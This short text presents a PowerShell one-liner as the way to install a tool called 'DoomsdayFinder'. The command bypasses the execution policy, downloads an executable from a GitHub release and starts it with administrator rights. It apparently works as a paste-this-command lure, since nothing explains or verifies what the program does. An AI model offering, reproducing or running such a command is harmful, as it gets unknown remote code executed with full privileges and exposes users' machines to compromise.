
You can install the tool with this "powershell -NoProfile -ExecutionPolicy Bypass -Command "$url = 'https://github.com/wism126/Doomsday-finder/releases/download/DoomsdayFinder/DoomsdayFinder.exe'; $output = Join-Path $env:USERPROFILE 'Downloads\DoomsdayFinder.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Verb RunAs" & exit"
